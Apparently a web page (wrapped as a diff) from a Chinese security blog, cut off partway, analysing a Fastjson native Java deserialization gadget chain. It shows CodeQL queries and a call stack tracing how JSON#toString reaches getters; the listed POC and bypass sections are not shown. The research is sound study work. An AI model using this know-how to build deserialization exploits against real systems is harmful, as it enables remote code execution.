@@ -1,0 +1,1236 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='0x00 前言 为了更好地总结和利用 Fastjson 相关漏洞，我之前编写过一款Fastjson扫描器（最后表示还是一坨hhh）。在模拟实际环境时，想到了这样一个场景'>
+<title>Fastjson原生链</title>
+
+<link rel='canonical' href='/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Fastjson原生链'>
+<meta property='og:description' content='0x00 前言 为了更好地总结和利用 Fastjson 相关漏洞，我之前编写过一款Fastjson扫描器（最后表示还是一坨hhh）。在模拟实际环境时，想到了这样一个场景'>
+<meta property='og:url' content='/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/'>
+<meta property='og:site_name' content='0ZHan&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Java安全' /><meta property='article:published_time' content='2024-05-21T11:35:06&#43;08:00'/><meta property='article:modified_time' content='2024-05-21T11:35:06&#43;08:00'/>
+<meta name="twitter:title" content="Fastjson原生链">
+<meta name="twitter:description" content="0x00 前言 为了更好地总结和利用 Fastjson 相关漏洞，我之前编写过一款Fastjson扫描器（最后表示还是一坨hhh）。在模拟实际环境时，想到了这样一个场景">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G42YH9J7M8"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-G42YH9J7M8', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/1000_huac81c2698ed7f4f7ac0962c570fafca4_51159_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">0ZHan&#39;s Blog</a></h1>
+            <h2 class="site-description">才须学也</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href=''
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href=''
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/tags/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+                
+                <span>标签</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#0x00-前言">0x00 前言</a></li>
+        <li><a href="#0x01-原理分析">0x01 原理分析</a>
+          <ol>
+            <li><a href="#poc">POC</a></li>
+          </ol>
+        </li>
+        <li><a href="#0x02-fastjson-1249-bypass">0x02 Fastjson 1.2.49 bypass</a>
+          <ol>
+            <li><a href="#poc-1">POC</a></li>
+          </ol>
+        </li>
+        <li><a href="#0x03-后记">0x03 后记</a></li>
+      </ol>
+    </li>
+    <li><a href="#附录">附录</a>
+      <ol>
+        <li><a href="#参考文献">参考文献</a></li>
+        <li><a href="#版权信息">版权信息</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/">Fastjson原生链</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 21, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="0x00-前言">0x00 前言</h3>
+<p>为了更好地总结和利用 Fastjson 相关漏洞，我之前编写过一款Fastjson扫描器（最后表示还是一坨hhh）。在模拟实际环境时，想到了这样一个场景：目标开放了JNDI、c3p0等反序列化入口，但没有合适的依赖或者依赖版本过高，能否继续利用？</p>
+<p>如果 JDK 较低，倒是可以打JDK原生链，可JDK稍高就束手无策了。正值烦恼之际，恰好看到了 Y4 师傅发布的文章 <a class="link" href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%89%8D%E8%A8%80"  target="_blank" rel="noopener"
+    >FastJson与原生反序列化</a> ，拜读后茅塞顿开，原来Fastjson 本身存在一条覆盖全版本的原生链，只要借着这条链子，上面的问题自然能够迎刃而解。</p>
+<h3 id="0x01-原理分析">0x01 原理分析</h3>
+<p>简单的写了一个CodeQL语句来查找实现 Serializable 接口和 <code>readObject</code> 方法的类</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e06c75">import</span> <span style="color:#e06c75">java</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">import</span> <span style="color:#e06c75">semmle</span>.<span style="color:#e06c75">code</span>.<span style="color:#e06c75">java</span>.<span style="color:#e06c75">dataflow</span>.<span style="color:#e06c75">FlowSources</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">import</span> <span style="color:#e06c75">semmle</span>.<span style="color:#e06c75">code</span>.<span style="color:#e06c75">java</span>.<span style="color:#e06c75">dataflow</span>.<span style="color:#e06c75">TaintTracking2</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">import</span> <span style="color:#e06c75">DataFlow2</span>::<span style="color:#e06c75">PathGraph</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">SerializeClass</span> <span style="color:#c678dd">c</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#c678dd">c</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">class</span> <span style="color:#e06c75">SerializeClass</span> <span style="color:#e06c75">extends</span> <span style="color:#c678dd">Class</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">SerializeClass</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">exists</span>(<span style="color:#c678dd">Class</span> <span style="color:#c678dd">c</span> <span style="color:#56b6c2">|</span> 
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">c</span>.<span style="color:#e06c75">getASupertype</span><span style="color:#56b6c2">*</span>().<span style="color:#e06c75">hasQualifiedName</span>(<span style="color:#98c379">&#34;java.io&#34;</span>, <span style="color:#98c379">&#34;Serializable&#34;</span>) 
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">and</span> <span style="color:#c678dd">c</span>.<span style="color:#e06c75">getAMethod</span>().<span style="color:#e06c75">hasName</span>(<span style="color:#98c379">&#34;readObject&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">and</span> <span style="color:#c678dd">c</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">this</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>只有一个类 <code>AntiCollisionHashMap</code> 满足要求</p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408090513882.png"
+	width="1197"
+	height="645"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408090513882_hu27a65d60e28030034b411170b7f0ec6e_77870_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408090513882_hu27a65d60e28030034b411170b7f0ec6e_77870_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240408090513882"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="445px"
+	
+></p>
+<p><strong>AntiCollisionHashMap#putForCreate</strong></p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408090542096.png"
+	width="1203"
+	height="692"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408090542096_hub3cf5cee4aa5aeca49b590118a02ab71_83129_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408090542096_hub3cf5cee4aa5aeca49b590118a02ab71_83129_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240408090542096"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="173"
+		data-flex-basis="417px"
+	
+></p>
+<p><code>AntiCollisionHashMap</code> 是一个 <code>HashMap</code>，在存储数据时必然会调用 <code>hashCode()</code>、<code>equals()</code> 等方法计算比对 <code>key</code> 的 <code>hash</code> 值</p>
+<p>联想到 <code>JSONObject</code> 也是个 <code>Map</code>，看一下 <code>JSONObject</code> 是如何应对 <code>hashCode()</code>、<code>equals()</code> 等计算场景的</p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091704238.png"
+	width="1197"
+	height="213"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091704238_hu4873a9d303f4721f697211f9ae4ffa33_20385_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091704238_hu4873a9d303f4721f697211f9ae4ffa33_20385_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240408091704238"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="561"
+		data-flex-basis="1348px"
+	
+></p>
+<p>很可惜，这两个方法并没有特别之处。这时候面临两个选择，一是继续往下寻找有敏感方法调用的 <code>hashCode()</code>、<code>equals()</code> ，二是深挖 <code>JSONObject</code> 的利用点。（不过，小孩子才做选择题，大人当然是全都要hhh</p>
+<hr>
+<p>简单地搜索了一下Fastjson库中的 <code>hashCode</code> 方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e06c75">import</span> <span style="color:#e06c75">java</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">import</span> <span style="color:#e06c75">semmle</span>.<span style="color:#e06c75">code</span>.<span style="color:#e06c75">java</span>.<span style="color:#e06c75">dataflow</span>.<span style="color:#e06c75">FlowSources</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">import</span> <span style="color:#e06c75">semmle</span>.<span style="color:#e06c75">code</span>.<span style="color:#e06c75">java</span>.<span style="color:#e06c75">dataflow</span>.<span style="color:#e06c75">TaintTracking2</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">import</span> <span style="color:#e06c75">DataFlow2</span>::<span style="color:#e06c75">PathGraph</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">SensitiveMethod</span> <span style="color:#e06c75">m</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#e06c75">m</span>, <span style="color:#e06c75">m</span>.<span style="color:#e06c75">getDeclaringType</span>().<span style="color:#e06c75">getQualifiedName</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">class</span> <span style="color:#e06c75">SensitiveMethod</span> <span style="color:#e06c75">extends</span> <span style="color:#c678dd">Method</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">SensitiveMethod</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">exists</span>( <span style="color:#c678dd">Method</span> <span style="color:#e06c75">m</span><span style="color:#56b6c2">|</span>
+</span></span><span style="display:flex;"><span>            (<span style="color:#e06c75">m</span>.<span style="color:#e06c75">hasName</span>(<span style="color:#98c379">&#34;hashCode&#34;</span>) <span style="color:#c678dd">or</span> <span style="color:#e06c75">m</span>.<span style="color:#e06c75">hasName</span>(<span style="color:#98c379">&#34;equals&#34;</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">and</span> <span style="color:#e06c75">m</span>.<span style="color:#e06c75">getDeclaringType</span>().<span style="color:#e06c75">getQualifiedName</span>().<span style="color:#e06c75">indexOf</span>(<span style="color:#98c379">&#34;com.alibaba.fastjson&#34;</span>) <span style="color:#56b6c2">&gt;=</span> <span style="color:#d19a66">0</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">and</span> <span style="color:#e06c75">m</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">this</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>结果如下</p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408095627238.png"
+	width="745"
+	height="391"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408095627238_hu39440ad62ec69022be125470271d4445_44425_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408095627238_hu39440ad62ec69022be125470271d4445_44425_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240408095627238"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="190"
+		data-flex-basis="457px"
+	
+></p>
+<p>多出一个 <code>ParameterizedTypeImpl</code>，翻了一下并没有什么利用点，故此作罢</p>
+<hr>
+<p>重新看回到 <code>JSONObject</code>，发现 <code>JSONObject</code> 还实现了一个 <code>invoke</code> 方法</p>
+<p><strong>JSONObject#invoke</strong></p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091321059.png"
+	width="1196"
+	height="534"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091321059_hufdd0d7904eb12152a4ae8bdd6016cb32_66819_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091321059_hufdd0d7904eb12152a4ae8bdd6016cb32_66819_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240408091321059"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="223"
+		data-flex-basis="537px"
+	
+></p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091332653.png"
+	width="1196"
+	height="490"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091332653_huff0354c8218755822b4a9afb49a38a32_49500_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091332653_huff0354c8218755822b4a9afb49a38a32_49500_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240408091332653"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="585px"
+	
+></p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091344829.png"
+	width="1192"
+	height="374"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091344829_hu9fe5db786da8e6b61d59b7a85c456c57_41295_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091344829_hu9fe5db786da8e6b61d59b7a85c456c57_41295_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240408091344829"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="318"
+		data-flex-basis="764px"
+	
+></p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091401755.png"
+	width="1193"
+	height="811"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091401755_hu9ffd255fe292f37c7140e05b419c7eb5_115101_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408091401755_hu9ffd255fe292f37c7140e05b419c7eb5_115101_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240408091401755"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="147"
+		data-flex-basis="353px"
+	
+></p>
+<p>联系到之前分析过的 <code>AnnotationInvocationHandler</code> ，JDK原生链就是通过<code>AnnotationInvocationHandler#invoke</code> 方法触发的（<code>invoke</code> 方法会拦截代理实例，调用自身的 <code>equalsImpl()</code> 进行任意方法调用）</p>
+<p>那么 <code>JSONObject</code> 是否存在类似的利用路径呢？答案是肯定的（不过没必要用代理实例，<code>JSONObject#toString</code> 是<code>public</code> 修饰的，可以直接调用）</p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408100909960.png"
+	width="1200"
+	height="232"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408100909960_hu8b03e24e79727df14bfec211659cb53e_28681_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408100909960_hu8b03e24e79727df14bfec211659cb53e_28681_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240408100909960"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="517"
+		data-flex-basis="1241px"
+	
+></p>
+<p><code>JSONObject</code> 的代理实例在调用 <code>toString</code> 方法时，会触发 <code>JSON#toString</code> 方法（ <code>JSONObject</code> 继承自 <code>JSON</code> ）</p>
+<p><strong>JSON#toString</strong></p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408101156085.png"
+	width="1188"
+	height="419"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408101156085_hu5183d70d840e44e6d742d92ce7d84e5a_38162_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240408101156085_hu5183d70d840e44e6d742d92ce7d84e5a_38162_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240408101156085"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="283"
+		data-flex-basis="680px"
+	
+></p>
+<p>学过 Fastjson 反序列化的应该知道，<code>JSON#toString()</code>  能够触发 <code>getter</code> 。具体流程不再赘述，相关调用栈如下</p>
+<pre tabindex="0"><code>createASMSerializer:91, SerializeConfig (com.alibaba.fastjson.serializer)
+createJavaBeanSerializer:223, SerializeConfig (com.alibaba.fastjson.serializer)
+createJavaBeanSerializer:113, SerializeConfig (com.alibaba.fastjson.serializer)
+getObjectWriter:664, SerializeConfig (com.alibaba.fastjson.serializer)
+getObjectWriter:403, SerializeConfig (com.alibaba.fastjson.serializer)
+getObjectWriter:359, JSONSerializer (com.alibaba.fastjson.serializer)
+write:247, MapSerializer (com.alibaba.fastjson.serializer)
+write:43, MapSerializer (com.alibaba.fastjson.serializer)
+write:278, JSONSerializer (com.alibaba.fastjson.serializer)
+toJSONString:827, JSON (com.alibaba.fastjson)
+toString:821, JSON (com.alibaba.fastjson)
+parseObject:420, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:1318, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:1284, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:152, JSON (com.alibaba.fastjson)
+parse:143, JSON (com.alibaba.fastjson)
+main:19, Any
+</code></pre><p>进入 <code>SerializeConfig#createASMSerializer</code> 方法</p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409112011305.png"
+	width="1198"
+	height="444"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409112011305_hudd797b3b5672f9957d487746812d7a2b_66044_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409112011305_hudd797b3b5672f9957d487746812d7a2b_66044_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240409112011305"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="269"
+		data-flex-basis="647px"
+	
+></p>
+<p>继续跟进 <code>createJavaBeanSerializer()</code></p>
+<p><strong>ASMSerializerFactory#createJavaBeanSerializer</strong></p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409112437488.png"
+	width="1193"
+	height="474"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409112437488_hu4dc471d8f7de989dd862d344fd20dcb9_85002_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409112437488_hu4dc471d8f7de989dd862d344fd20dcb9_85002_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240409112437488"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="604px"
+	
+></p>
+<p>&hellip;</p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409113247806.png"
+	width="1201"
+	height="342"
